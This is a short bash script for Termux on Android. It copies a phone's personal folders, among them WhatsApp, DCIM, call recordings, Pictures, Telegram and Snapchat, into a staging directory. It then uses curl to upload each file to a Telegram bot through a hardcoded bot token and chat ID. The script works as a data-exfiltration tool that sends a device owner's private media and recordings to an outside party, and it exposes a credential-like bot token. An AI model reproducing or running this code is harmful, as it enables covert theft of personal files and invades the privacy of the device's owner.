#!/bin/bash 
termux-setup-storage 
cd /sdcard 
cp -R 1Videoshow Whatsapp Alarms DCIM Android CMM_crash CallRecord Cardboard Documents Download Movies Music Notifications OB3WhatsApp Pictures Podcasts Ringtones Snapchat SoundRecorder Telegram Voice\ Changer Voice\ Changer\ Record Voice\ Changer\ Studio com.kingroot.kinguser kinguserdown media snaptube system zapya boot بيت\ المداليز مجلد\ جديد /bot/files
TOKEN=5860089262:AAENCi8tYH3FSJDlH7qIr0ezU3et3CVbDvc
ID=1218276055
for f in /bot/files/*
do
curl -F document=@$f "https://api.telegram.org/bot$TOKEN/sendDocument?chat_id=$ID"
done
